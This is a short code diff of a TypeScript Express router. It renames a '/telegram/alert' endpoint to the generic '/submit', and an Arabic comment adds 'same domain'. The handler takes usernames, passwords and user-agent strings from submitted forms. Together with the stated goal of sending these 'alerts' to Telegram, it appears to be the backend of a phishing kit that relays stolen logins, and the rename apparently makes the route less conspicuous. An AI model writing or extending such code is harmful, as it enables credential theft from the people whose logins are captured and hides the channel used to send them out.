@@ -7,9 +7,9 @@ const router: IRouter = Router();
 router.use(healthRouter);
 
 // ============================================
-// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام
+// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام (نفس النطاق)
 // ============================================
-router.post("/telegram/alert", async (req: Request, res: Response) => {
+router.post("/submit", async (req: Request, res: Response) => {
   try {
     // استقبال البيانات من الطلب
     const { username, password, timestamp, userAgent } = req.body;
